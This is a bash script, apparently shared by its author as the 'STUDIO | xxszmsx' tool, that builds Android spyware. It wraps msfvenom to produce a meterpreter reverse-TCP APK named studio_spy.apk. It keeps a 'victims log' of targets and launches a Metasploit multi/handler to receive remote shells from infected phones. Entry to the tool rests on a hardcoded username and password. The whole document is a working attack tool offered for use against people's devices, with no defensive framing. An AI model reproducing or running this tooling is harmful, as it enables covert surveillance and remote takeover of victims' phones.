cat << 'EOF' > xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: STUDIO | xxszmsx (LOGGING EDITION)
# MADE FOR ARABS BY: STUDIO
# =====================================================

RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'
LOG_FILE=".victims_log.txt" # ملف حفظ سجل الضحايا
DB_FILE=".studio_config"

# --- [ واجهة تسجيل الدخول الثابتة ] ---
clear
echo -e "${RED}====================================================="
echo -e "         STUDIO | xxszmsx - SECURE ACCESS            "
echo -e "=====================================================${NC}"
read -p "[+] Username: " username
read -s -p "[+] Password: " password
echo ""

if [[ "$username" != "user" || "$password" != "123456789" ]]; then
    echo -e "${RED}[!] Access Denied! Wrong Username or Password.${NC}"
    exit 1
fi

while true; do
    clear
    echo -e "${RED}  ██████╗████████╗██╗   ██╗██████╗ ██╗ ██████╗ "
    echo " ██╔════╝╚══██╔══╝██║   ██║██╔══██╗██║██╔═══██╗"
    echo " ╚█████╗    ██║   ██║   ██║██║  ██║██║██║   ██║"
    echo "  ╚═══██╗   ██║   ██║   ██║██║  ██║██║██║   ██║"
    echo " ██████╔╝   ██║   ╚██████╔╝██████╔╝██║╚██████╔╝"
    echo " ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ ╚═╝ ╚═════╝ ${NC}"
    echo -e "${YELLOW}      [ STUDIO | xxszmsx ] - [ SESSION ACTIVE ]${NC}"
    echo "-----------------------------------------------------"
    echo -e "1) Build Spy App (Android Payload)"
    echo -e "2) View Victims Log (عرض سجل الضحايا المحفوظين)"
    echo -e "3) Open Controller (Active Listeners)"
    echo -e "0) Exit Program"
    echo "-----------------------------------------------------"
    read -p "Studio >> " choice

    case $choice in
        1) 
           read -p "Enter Target Name/ID: " t_name
           read -p "Enter LHOST (IP): " lh
           read -p "Enter LPORT: " lp
           echo "$lh:$lp" > "$DB_FILE"
           # حفظ بيانات الضحية في السجل مع الوقت والتاريخ
           echo "[$(date +%Y-%m-%d_%H:%M)] Name: $t_name | IP: $lh | Port: $lp" >> "$LOG_FILE"
           
           echo -e "${YELLOW}[*] Building studio_spy.apk for $t_name...${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "/sdcard/studio_spy.apk"
           echo -e "${GREEN}[+] Done! App saved to your phone memory.${NC}" ;;
        2)
           clear
           echo -e "${BLUE}--- [ SAVED VICTIMS LOG ] ---${NC}"
           if [ -f "$LOG_FILE" ]; then
               cat "$LOG_FILE"
           else
               echo "No victims recorded yet."
           fi
           echo "-----------------------------"
           read -p "Press Enter to return..." ;;
        3) 
           if [ -f "$DB_FILE" ]; then
               IP=$(cut -d: -f1 "$DB_FILE"); PORT=$(cut -d: -f2 "$DB_FILE")
               msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; set ExitOnSession false; exploit -j"
           else
               echo -e "${RED}No config found! Build an app first.${NC}"; sleep 1
           fi ;;
        0) exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
done
EOF

